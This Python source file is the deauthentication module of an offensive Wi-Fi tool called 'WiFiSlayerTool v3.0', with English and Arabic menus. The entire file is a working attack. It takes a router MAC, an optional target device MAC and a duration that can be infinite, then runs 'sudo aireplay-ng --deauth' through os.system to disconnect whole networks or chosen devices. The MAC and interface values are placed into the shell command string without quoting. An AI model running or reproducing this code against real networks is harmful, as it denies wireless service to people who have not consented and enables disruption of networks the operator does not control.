# -*- coding: utf-8 -*-
"""
WiFiSlayerTool v3.0 — Deauthentication Attacks Module
Disconnect networks or specific devices using aireplay-ng.
"""

import os

from core.logger import log
from core.ui import (
    console, print_section, print_success, print_error,
    print_warning, print_info, select_interface, print_sub_menu,
    confirm_action,
)
from core.validator import safe_input, validate_mac, validate_duration
from core.network import get_wireless_interfaces
from core.ascii_art import print_skull_art
from config import get_text


def attacker_menu(current_interface=None):
    """Deauthentication attacks sub-menu."""
    while True:
        console.print()
        if get_text("choose") == "اختر":
            options = [
                ("1", "💥", "فصل شبكة كاملة (Deauth Network)"),
                ("2", "🎯", "فصل جهاز معين من الشبكة"),
            ]
        else:
            options = [
                ("1", "💥", "Disconnect Entire Network (Deauth)"),
                ("2", "🎯", "Disconnect Specific Device"),
            ]

        title = "⚡ " + get_text("menu_deauth")
        print_sub_menu(title, options)

        choice = console.input(f"\n  [bold bright_cyan]➤ {get_text('choose')}:[/] ").strip()

        if choice == "1":
            deauth_network(current_interface)
        elif choice == "2":
            deauth_device(current_interface)
        elif choice == "0":
            break
        else:
            print_error(get_text("invalid_choice"))


def deauth_network(interface=None):
    """Disconnect all devices from a network using aireplay-ng."""
    os.system("clear" if os.name != "nt" else "cls")
    print_skull_art()
    print_section("Deauth — Entire Network")

    if not interface:
        interfaces = get_wireless_interfaces()
        interface = select_interface(interfaces)
        if not interface:
            print_error(get_text("no_interface"))
            return

    mac = safe_input(get_text("enter_mac"), validate_mac, console)
    if not mac:
        return

    duration = safe_input(get_text("enter_duration"), validate_duration, console)
    if duration is None:
        return

    # ─── Confirmation ────────────────────────────────────────
    console.print()
    print_warning(f"{get_text('target')} [bold]{mac}[/] on [bold]{interface}[/]")
    console.print()

    if not confirm_action(get_text("confirm_attack")):
        print_info(get_text("attack_cancelled"))
        return

    log.info(f"Deauth attack: network={mac}, duration={duration}, interface={interface}")
    print_info(f"{get_text('starting_attack')} {get_text('press_ctrl_c')}")
    console.print()

    try:
        os.system(f"sudo aireplay-ng --deauth {duration} -a {mac} {interface}")
    except KeyboardInterrupt:
        console.print()
        print_info(get_text("attack_stopped"))

    log.info("Deauth attack completed/stopped")


def deauth_device(interface=None):
    """Disconnect a specific device from a network."""
    os.system("clear" if os.name != "nt" else "cls")
    print_skull_art()
    print_section("Deauth — Specific Device")

    if not interface:
        interfaces = get_wireless_interfaces()
        interface = select_interface(interfaces)
        if not interface:
            print_error("No interface selected")
            return

    router_mac = safe_input(
        "Enter router/AP MAC address / أدخل MAC الراوتر",
        validate_mac, console,
    )
    if not router_mac:
        return

    device_mac = safe_input(
        "Enter target device MAC / أدخل MAC الجهاز المستهدف",
        validate_mac, console,
    )
    if not device_mac:
        return

    duration = safe_input(get_text("enter_duration"), validate_duration, console)
    if duration is None:
        return

    # ─── Confirmation ────────────────────────────────────────
    console.print()
    print_warning(f"Router MAC     : [bold]{router_mac}[/]")
    print_warning(f"Target Device  : [bold]{device_mac}[/]")
    print_warning(f"Duration       : [bold]{duration if duration > 0 else '∞ Infinite'}[/]")
    print_warning(f"Interface      : [bold]{interface}[/]")
    console.print()

    if not confirm_action(get_text("confirm_attack")):
        print_info(get_text("attack_cancelled"))
        return

    log.info(f"Deauth device: router={router_mac}, target={device_mac}, "
             f"duration={duration}, interface={interface}")
    print_info("Launching targeted deauthentication ...")
    console.print()

    try:
        os.system(
            f"sudo aireplay-ng -0 {duration} -a {router_mac} "
            f"-c {device_mac} {interface}"
        )
    except KeyboardInterrupt:
        console.print()
        print_info("Attack stopped by user")

    log.info("Targeted deauth completed/stopped")
